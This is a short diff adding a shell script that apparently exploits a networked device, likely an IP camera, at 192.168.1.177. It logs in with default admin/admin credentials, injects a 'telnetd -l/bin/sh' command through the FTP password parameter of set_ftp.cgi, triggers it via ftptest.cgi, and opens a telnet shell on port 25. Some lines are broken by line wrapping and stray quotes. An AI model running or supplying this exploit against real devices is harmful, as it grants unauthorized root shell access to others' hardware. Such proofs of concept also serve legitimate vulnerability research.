@@ -1,0 +1,11 @@
+#!/bin/sh
+            wget -q'-
+            'http://192.168.1.177/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&l
+            oginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -
+            l/bin/sh)&dir=/&mode=PORT&upload_interval=0'
+            wget -qO-
+            'http://192.168.1.177/ftptest.cgi?next_url=test_ftp.htm&loginuse=ad
+            min&loginpas=admin'
+            telnet 192.168.1.177 25
+
+
